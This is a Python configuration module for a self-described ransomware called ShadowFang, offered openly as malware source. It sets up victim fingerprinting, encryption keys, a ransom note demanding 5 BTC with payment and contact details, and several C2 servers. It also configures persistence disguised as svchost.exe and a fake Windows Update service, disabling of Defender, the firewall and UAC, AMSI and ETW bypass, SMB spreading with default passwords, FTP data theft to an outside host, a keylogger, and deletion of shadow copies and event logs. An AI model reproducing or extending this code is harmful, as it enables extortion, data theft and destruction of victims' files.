#!/usr/bin/env python3
"""
SHADOWFANG CORE - CONFIG.PY
Configuration management for all ransomware operations
Handles victim identification, encryption settings, C2 config, ransom details
"""

import os
import json
import base64
import hashlib
import winreg
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== CONFIGURATION CLASS ====================

class RansomwareConfig:
    """Centralized configuration manager for ShadowFang ransomware"""
    
    _instance = None
    _initialized = False
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not RansomwareConfig._initialized:
            self._load_defaults()
            RansomwareConfig._initialized = True
    
    def _load_defaults(self):
        """Load default configuration values"""
        
        # ==================== VICTIM IDENTITY ====================
        self.victim_id = None
        self.computer_name = os.environ.get('COMPUTERNAME', 'UNKNOWN')
        self.username = os.environ.get('USERNAME', 'UNKNOWN')
        self.domain = os.environ.get('USERDOMAIN', 'WORKGROUP')
        self.os_version = self._get_os_version()
        self.architecture = 'x64' if CoreUtils.is_64bit() else 'x86'
        self.system_language = self._get_system_language()
        self.keyboard_layout = self._get_keyboard_layout()
        self.timezone = self._get_timezone()
        
        # ==================== ENCRYPTION SETTINGS ====================
        self.encryption_key = None          # AES-256 key
        self.encryption_salt = None         # PBKDF2 salt
        self.encryption_iv = None           # Initialization vector
        self.rsa_public_key = None          # RSA public key for key exchange
        self.rsa_private_key = None         # RSA private key (sent to C2)
        self.key_derivation_iterations = 200000
        self.chunk_size = 64 * 1024         # 64KB chunks
        self.encrypt_large_files = True
        self.max_file_size = 1024 * 1024 * 1024  # 1GB max
        self.partial_encryption = False     # Full encryption by default
        self.partial_encryption_size = 0    # Bytes to encrypt if partial
        
        # ==================== TARGET SELECTION ====================
        self.target_extensions = Constants.TARGET_EXTENSIONS
        self.skip_directories = Constants.SKIP_DIRECTORIES
        self.skip_files = [
            'desktop.ini',
            'thumbs.db',
            'ntuser.dat',
            'pagefile.sys',
            'hiberfil.sys',
            'swapfile.sys',
            'README_DECRYPT.txt',
            'README_DECRYPT.html'
        ]
        self.target_drives = self._get_available_drives()
        self.encrypt_network_drives = True
        self.encrypt_removable_drives = True
        self.encrypt_cloud_drives = False  # Skip OneDrive/Google Drive sync folders
        
        # ==================== RANSOM DETAILS ====================
        self.ransom_amount = "5 BTC"
        self.bitcoin_address = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
        self.monero_address = "4B9c4JkQ4oqGqZxJJhKdLpYtJqy8YrN3TqFhHq3JmQ"
        self.ethereum_address = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
        self.contact_email = "shadowfang@onionmail.org"
        self.contact_jabber = "shadowfang@jabber.org"
        self.contact_telegram = "@shadowfang_support"
        self.deadline_hours = 72
        self.discount_enabled = True
        self.discount_percent = 50
        self.discount_deadline_hours = 24
        self.payment_verification_method = "auto"  # auto, manual
        self.unique_payment_address = True  # Generate unique address per victim
        
        # ==================== RANSOM NOTE ====================
        self.ransom_note_title = "SHADOWFANG RANSOMWARE"
        self.ransom_note_template = self._get_default_ransom_note()
        self.note_filename = "README_DECRYPT.txt"
        self.note_html_filename = "README_DECRYPT.html"
        self.drop_note_on_desktop = True
        self.drop_note_on_all_drives = True
        self.change_wallpaper = True
        self.wallpaper_text = "YOUR FILES ARE ENCRYPTED - READ README_DECRYPT.txt"
        
        # ==================== C2 SERVER ====================
        self.c2_servers = [
            "https://c2-shadowfang-1.onion",
            "https://c2-shadowfang-2.onion",
            "https://backup-c2.shadowfang.net"
        ]
        self.c2_current_index = 0
        self.c2_backup_enabled = True
        self.c2_communication_interval = 300  # 5 minutes
        self.c2_protocol = "https"
        self.c2_encryption = "AES-256-GCM"
        self.c2_auth_token = None
        self.send_victim_info = True
        self.send_encryption_report = True
        self.send_screenshots = False
        self.send_keylogs = False
        
        # ==================== PERSISTENCE ====================
        self.persistence_methods = [
            'registry_run',
            'startup_folder',
            'scheduled_task',
            'service_install',
            'wmi_subscription'
        ]
        self.persistence_enabled = True
        self.persistence_install_delay = 2  # seconds
        self.camouflage_name = "svchost.exe"
        self.camouflage_path = os.path.join(
            os.environ.get('APPDATA', 'C:\\Users\\Public'),
            'svchost.exe'
        )
        self.service_name = "WindowsUpdate"
        self.service_display_name = "Windows Update Service"
        self.service_description = "Ensures Windows updates are installed properly"
        self.scheduled_task_name = "WindowsUpdateTask"
        self.scheduled_task_trigger = "onlogon"
        
        # ==================== SYSTEM LOCKDOWN ====================
        self.lock_keyboard_mouse = True
        self.lock_screen = True
        self.disable_task_manager = True
        self.disable_cmd = True
        self.disable_registry = True
        self.disable_safe_mode = True
        self.disable_system_restore = True
        self.disable_windows_defender = True
        self.disable_firewall = True
        self.disable_uac = True
        self.disable_updates = True
        
        # ==================== EVASION ====================
        self.bypass_amsi = True
        self.bypass_etw = True
        self.bypass_uac = True
        self.disable_defender = True
        self.anti_debug = True
        self.anti_vm = True
        self.anti_sandbox = True
        self.obfuscate_strings = True
        self.use_polymorphism = False
        self.delay_execution = True
        self.delay_seconds = 5
        self.randomize_delay = True
        self.delay_jitter_percent = 50
        
        # ==================== NETWORK SPREADING ====================
        self.enable_spreading = False
        self.spread_methods = [
            'smb_exploit',
            'network_shares',
            'email_harvest',
            'usb_drop'
        ]
        self.spread_smb_credentials = [
            ('admin', 'admin'),
            ('administrator', 'administrator'),
            ('admin', 'password'),
            ('user', 'password123')
        ]
        self.spread_network_ranges = []
        self.spread_usb_enabled = True
        self.spread_usb_filename = "Important_Document.exe"
        self.spread_usb_autorun = True
        
        # ==================== DATA EXFILTRATION ====================
        self.enable_data_theft = False
        self.data_theft_extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.pdf',
            '.db', '.sql', '.pst', '.ost'
        ]
        self.data_theft_max_size = 10 * 1024 * 1024  # 10MB per file
        self.data_theft_total_limit = 500 * 1024 * 1024  # 500MB total
        self.data_theft_upload_method = "ftp"
        self.data_theft_server = "ftp.shadowfang.net"
        self.data_theft_credentials = None
        
        # ==================== KEYLOGGER ====================
        self.enable_keylogger = False
        self.keylogger_interval = 60  # Send logs every 60 seconds
        self.keylogger_max_buffer = 10000  # Max keystrokes buffer
        self.keylogger_capture_clipboard = True
        self.keylogger_capture_screenshots = False
        self.keylogger_screenshot_interval = 300
        
        # ==================== SELF-DESTRUCT ====================
        self.enable_melt = True
        self.melt_delay = 10  # seconds after encryption
        self.melt_overwrite = True
        self.melt_overwrite_passes = 1
        self.delete_shadow_copies = True
        self.delete_event_logs = True
        self.delete_prefetch = True
        self.clear_recycle_bin = True
        
        # ==================== LOGGING ====================
        self.enable_logging = True
        self.log_level = "INFO"  # DEBUG, INFO, WARNING, ERROR, CRITICAL
        self.log_to_file = False
        self.log_file_path = os.path.join(
            os.environ.get('TEMP', 'C:\\Windows\\Temp'),
            'shadowfang.log'
        )
        self.send_logs_to_c2 = True
        
        # ==================== TIMING ====================
        self.encryption_start_delay = 3
        self.encryption_between_files_delay = 0.001
        self.ransom_screen_delay = 1
        self.persist_before_encrypt = True
        self.lock_before_encrypt = True
        self.encrypt_priority = "high"  # high, normal, low
        
        # Initialize derived values
        self._initialize_derived_values()
    
    def _initialize_derived_values(self):
        """Initialize values derived from other configuration"""
        # Generate victim ID
        if not self.victim_id:
            self.victim_id = CoreUtils.generate_unique_id('SF-')
        
        # Set camouflage path
        self.camouflage_path = os.path.join(
            os.environ.get('APPDATA', 'C:\\Users\\Public'),
            self.camouflage_name
        )
        
        # Initialize C2 auth token
        if not self.c2_auth_token:
            self.c2_auth_token = hashlib.sha256(
                f"{self.victim_id}{datetime.now().timestamp()}".encode()
            ).hexdigest()[:32]
        
        # Log configuration
        logger.info(f"Configuration initialized for victim: {self.victim_id}")
    
    def _get_os_version(self):
        """Get Windows version"""
        try:
            import platform
            version = platform.version()
            release = platform.release()
            
            if release == '7':
                return f"Windows 7 ({version})"
            elif release == '8':
                return f"Windows 8 ({version})"
            elif release == '8.1':
                return f"Windows 8.1 ({version})"
            elif release == '10':
                return f"Windows 10 ({version})"
            elif release == '11':
                return f"Windows 11 ({version})"
            else:
                return f"Windows {release} ({version})"
        except:
            return "Unknown Windows Version"
    
    def _get_system_language(self):
        """Get system language"""
        try:
            return winreg.QueryValueEx(
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"SYSTEM\CurrentControlSet\Control\Nls\Language"),
                "InstallLanguage"
            )[0]
        except:
            return "en-US"
    
    def _get_keyboard_layout(self):
        """Get keyboard layout"""
        try:
            return hex(WinAPI.user32.GetKeyboardLayout(0) & 0xFFFF)
        except:
            return "0x0409"
    
    def _get_timezone(self):
        """Get system timezone"""
        try:
            import time
            return time.tzname[0]
        except:
            return "Unknown"
    
    def _get_available_drives(self):
        """Get available drives"""
        drives = []
        try:
            all_drives = WinAPI.get_logical_drives()
            for drive in all_drives:
                drive_type = WinAPI.get_drive_type(drive)
                if drive_type in [Constants.DRIVE_FIXED, Constants.DRIVE_REMOVABLE]:
                    drives.append(drive)
        except:
            drives = ['C:\\']
        return drives
    
    def _get_default_ransom_note(self):
        """Get default ransom note template"""
        return """
==============================================
        {title}
==============================================

YOUR FILES HAVE BEEN ENCRYPTED!

All your important files have been encrypted with military-grade
AES-256 encryption. Your documents, photos, databases, and other
files are no longer accessible.

To recover your files, you must pay a ransom of {amount}.

PAYMENT INFORMATION:
Bitcoin Address: {bitcoin}
Contact Email: {email}
Unique Victim ID: {victim_id}

STEPS TO RECOVER YOUR FILES:
1. Purchase {amount} in Bitcoin
2. Send payment to the address above
3. Email us with your Victim ID
4. Receive decryption tool within 24 hours

WARNING:
- Do NOT restart your computer
- Do NOT try to remove this software
- Do NOT attempt to decrypt files manually
- Do NOT contact law enforcement

After {deadline} hours, your decryption key will be permanently
destroyed and your files will be lost forever.

{time_remaining}

==============================================
    SHADOWFANG RANSOMWARE GROUP
==============================================
"""
    
    def generate_encryption_key(self, user_key=None):
        """Generate encryption key from user input or randomly"""
        try:
            if user_key:
                # Derive key from user input
                salt = os.urandom(32)
                self.encryption_salt = salt
                self.encryption_key = hashlib.pbkdf2_hmac(
                    'sha256',
                    user_key.encode(),
                    salt,
                    self.key_derivation_iterations,
                    dklen=32
                )
            else:
                # Generate random key
                self.encryption_key = os.urandom(32)
                self.encryption_salt = os.urandom(32)
            
            self.encryption_iv = os.urandom(16)
            
            logger.info("Encryption key generated")
            return True
        except Exception as e:
            logger.error(f"Key generation failed: {e}")
            return False
    
    def generate_rsa_keys(self):
        """Generate RSA keypair for hybrid encryption"""
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa
            
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=Constants.RSA_KEY_SIZE
            )
            
            self.rsa_private_key = private_key
            self.rsa_public_key = private_key.public_key()
            
            logger.info("RSA keypair generated")
            return True
        except Exception as e:
            logger.error(f"RSA key generation failed: {e}")
            return False
    
    def get_ransom_note(self):
        """Generate customized ransom note"""
        try:
            note = self.ransom_note_template.format(
                title=self.ransom_note_title,
                amount=self.ransom_amount,
                bitcoin=self.bitcoin_address,
                email=self.contact_email,
                victim_id=self.victim_id,
                deadline=self.deadline_hours
            )
            return note
        except:
            return self.ransom_note_template
    
    def get_c2_server(self):
        """Get current C2 server"""
        if not self.c2_servers:
            return None
        server = self.c2_servers[self.c2_current_index]
        # Rotate to next server for load balancing
        self.c2_current_index = (self.c2_current_index + 1) % len(self.c2_servers)
        return server
    
    def export_config(self, format='json'):
        """Export configuration for transmission"""
        try:
            config_dict = {
                'victim_id': self.victim_id,
                'computer_name': self.computer_name,
                'username': self.username,
                'os_version': self.os_version,
                'architecture': self.architecture,
                'target_extensions': self.target_extensions,
                'target_drives': self.target_drives,
                'ransom_amount': self.ransom_amount,
                'bitcoin_address': self.bitcoin_address,
                'contact_email': self.contact_email,
                'deadline_hours': self.deadline_hours,
                'c2_servers': self.c2_servers,
                'persistence_methods': self.persistence_methods,
                'encryption_algorithm': 'AES-256-CBC',
                'key_derivation': f'PBKDF2-SHA256-{self.key_derivation_iterations}',
                'timestamp': datetime.now().isoformat()
            }
            
            if format == 'json':
                return json.dumps(config_dict, indent=2)
            elif format == 'base64':
                return base64.b64encode(json.dumps(config_dict).encode()).decode()
            else:
                return config_dict
        except Exception as e:
            logger.error(f"Config export failed: {e}")
            return None
    
    def save_to_file(self, filepath=None):
        """Save configuration to file"""
        try:
            if not filepath:
                filepath = os.path.join(
                    os.environ.get('APPDATA', 'C:\\Users\\Public'),
                    'shadowfang_config.json'
                )
            
            config_json = self.export_config('json')
            with open(filepath, 'w') as f:
                f.write(config_json)
            
            logger.info(f"Configuration saved to {filepath}")
            return True
        except Exception as e:
            logger.error(f"Config save failed: {e}")
            return False
    
    def load_from_file(self, filepath):
        """Load configuration from file"""
        try:
            with open(filepath, 'r') as f:
                config_data = json.load(f)
            
            for key, value in config_data.items():
                if hasattr(self, key):
                    setattr(self, key, value)
            
            logger.info(f"Configuration loaded from {filepath}")
            return True
        except Exception as e:
            logger.error(f"Config load failed: {e}")
            return False
    
    def update_c2_server(self, new_server):
        """Add new C2 server"""
        if new_server not in self.c2_servers:
            self.c2_servers.append(new_server)
            logger.info(f"New C2 server added: {new_server}")
    
    def set_ransom_amount(self, amount, currency='BTC'):
        """Set ransom amount"""
        self.ransom_amount = f"{amount} {currency}"
        logger.info(f"Ransom amount set: {self.ransom_amount}")
    
    def set_bitcoin_address(self, address):
        """Set Bitcoin address"""
        self.bitcoin_address = address
        logger.info(f"Bitcoin address updated: {address[:8]}...")
    
    def enable_feature(self, feature_name):
        """Enable specific feature"""
        if hasattr(self, feature_name):
            setattr(self, feature_name, True)
            logger.info(f"Feature enabled: {feature_name}")
            return True
        return False
    
    def disable_feature(self, feature_name):
        """Disable specific feature"""
        if hasattr(self, feature_name):
            setattr(self, feature_name, False)
            logger.info(f"Feature disabled: {feature_name}")
            return True
        return False
    
    def get_feature_status(self, feature_name):
        """Get feature status"""
        if hasattr(self, feature_name):
            return getattr(self, feature_name)
        return None
    
    def validate_config(self):
        """Validate configuration integrity"""
        errors = []
        warnings = []
        
        # Check critical values
        if not self.victim_id:
            errors.append("Victim ID not generated")
        
        if not self.encryption_key:
            warnings.append("Encryption key not generated")
        
        if not self.bitcoin_address:
            errors.append("Bitcoin address not set")
        
        if not self.contact_email:
            errors.append("Contact email not set")
        
        if not self.target_extensions:
            errors.append("No target extensions specified")
        
        if not self.c2_servers:
            warnings.append("No C2 servers configured")
        
        if self.deadline_hours < 1:
            errors.append("Invalid deadline hours")
        
        # Log validation results
        if errors:
            for error in errors:
                logger.error(f"Config validation error: {error}")
        
        if warnings:
            for warning in warnings:
                logger.warning(f"Config validation warning: {warning}")
        
        return len(errors) == 0
    
    def get_summary(self):
        """Get configuration summary"""
        summary = f"""
╔════════════════════════════════════════╗
║     SHADOWFANG CONFIG SUMMARY          ║
╠════════════════════════════════════════╣
║ Victim ID: {self.victim_id:<28}║
║ Computer:  {self.computer_name:<28}║
║ User:      {self.username:<28}║
║ OS:        {self.os_version:<28}║
║ Arch:      {self.architecture:<28}║
╠════════════════════════════════════════╣
║ Ransom:    {self.ransom_amount:<28}║
║ Deadline:  {self.deadline_hours} hours{'':<20}║
║ Extensions:{len(self.target_extensions):<28}║
║ Drives:    {len(self.target_drives):<28}║
╠════════════════════════════════════════╣
║ C2 Servers:{len(self.c2_servers):<28}║
║ Persistence:{len(self.persistence_methods):<28}║
║ Keylogger:  {str(self.enable_keylogger):<28}║
║ Data Theft: {str(self.enable_data_theft):<28}║
║ Melt:       {str(self.enable_melt):<28}║
╚════════════════════════════════════════╝
"""
        return summary

# ==================== CONFIG BUILDER CLASS ====================

class ConfigBuilder:
    """Builder pattern for creating custom configurations"""
    
    def __init__(self):
        self.config = RansomwareConfig()
    
    def set_ransom_details(self, amount, bitcoin, email):
        """Set ransom payment details"""
        self.config.set_ransom_amount(amount)
        self.config.set_bitcoin_address(bitcoin)
        self.config.contact_email = email
        return self
    
    def set_deadline(self, hours):
        """Set payment deadline"""
        self.config.deadline_hours = hours
        return self
    
    def set_targets(self, extensions=None, drives=None):
        """Set target extensions and drives"""
        if extensions:
            self.config.target_extensions = extensions
        if drives:
            self.config.target_drives = drives
        return self
    
    def enable_keylogger(self):
        """Enable keylogger"""
        self.config.enable_keylogger = True
        return self
    
    def enable_data_theft(self, server=None):
        """Enable data exfiltration"""
        self.config.enable_data_theft = True
        if server:
            self.config.data_theft_server = server
        return self
    
    def enable_spreading(self):
        """Enable network spreading"""
        self.config.enable_spreading = True
        return self
    
    def enable_melt(self):
        """Enable self-destruct"""
        self.config.enable_melt = True
        return self
    
    def build(self):
        """Build and validate configuration"""
        if self.config.validate_config():
            return self.config
        return None

# ==================== SINGLETON INSTANCE ====================

config = RansomwareConfig()

# ==================== EXPORT ====================

__all__ = [
    'RansomwareConfig',
    'ConfigBuilder',
    'config'
]